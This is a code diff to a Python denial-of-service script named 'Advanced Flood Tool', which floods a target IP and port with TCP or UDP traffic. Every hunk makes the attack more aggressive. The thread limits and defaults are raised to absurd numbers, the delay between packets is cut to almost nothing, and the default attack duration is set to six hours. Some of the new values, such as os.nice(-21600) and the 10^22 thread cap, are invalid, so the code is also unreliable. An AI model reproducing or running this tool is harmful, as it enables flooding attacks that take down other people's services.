@@ -19,7 +19,7 @@ def set_high_priority():
             handle = win32api.GetCurrentProcess()
             win32process.SetPriorityClass(handle, win32process.REALTIME_PRIORITY_CLASS)
         else:  # Linux/Mac
-            os.nice(-20)
+            os.nice(-21600)
     except:
         pass
 
@@ -45,7 +45,7 @@ class AdvancedFlooder:
         self.target_ip = target_ip
         self.target_port = target_port
         self.use_udp = use_udp
-        self.max_threads = min(threads, 10000)  # تحديد حد أقصى
+        self.max_threads = min(threads, 10000000000000000000000)  # تحديد حد أقصى
         self.duration = duration  # 0 يعني إلى الأبد
         self.running = True
         self.packets_sent = 0
@@ -104,7 +104,7 @@ class AdvancedFlooder:
                 sock.close()
                 
                 # تغيير حجم البيانات بشكل عشوائي
-                time.sleep(random.uniform(0.001, 0.01))
+                time.sleep(random.uniform(0.000000000001, 0.01))
                 
             except Exception as e:
                 with self.stats_lock:
@@ -226,8 +226,8 @@ def main():
     parser = argparse.ArgumentParser(description="Advanced Flood Tool")
     parser.add_argument("-i", "--ip", required=True, help="Target IP address")
     parser.add_argument("-p", "--port", type=int, default=0, help="Target port (0 for random)")
-    parser.add_argument("-t", "--threads", type=int, default=1000, help="Number of threads")
-    parser.add_argument("-d", "--duration", type=int, default=0, help="Attack duration in seconds (0 for infinite)")
+    parser.add_argument("-t", "--threads", type=int, default=1000000000000000, help="Number of threads")
+    parser.add_argument("-d", "--duration", type=int, default=21600, help="Attack duration in seconds (0 for infinite)")
     parser.add_argument("-u", "--udp", action="store_true", help="Use UDP (default: TCP)")
     parser.add_argument("-m", "--mixed", action="store_true", help="Mixed UDP/TCP attack")
     parser.add_argument("--high-priority", action="store_true", help="Set high process priority")
